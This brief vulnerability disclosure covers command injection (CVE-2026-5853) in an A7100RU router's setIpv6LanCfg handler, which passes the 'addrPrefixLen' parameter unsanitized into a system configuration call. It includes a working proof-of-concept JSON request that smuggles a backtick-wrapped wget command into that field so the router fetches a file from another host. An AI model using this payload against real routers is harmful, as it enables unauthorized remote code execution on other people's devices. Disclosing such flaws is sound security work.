# A7100RU Vulnerability（CVE-2026-5853）
...
In  sub_431004 function, it reads in a user-provided parameter `addrPrefixLen` and passes its value to Uci_Set_Str function by strcat,which is defined in libcscommon.so.
...
We set `addrPrefixLen` as **\`wget 192.168.6.1:7777/testpoc\`** , and the router will execute it,such as:
...
{"topicurl":"setIpv6LanCfg","enableDhcpv6":"1","addrPrefixLen":"`wget 192.168.6.1:7777/testpoc`"}
```
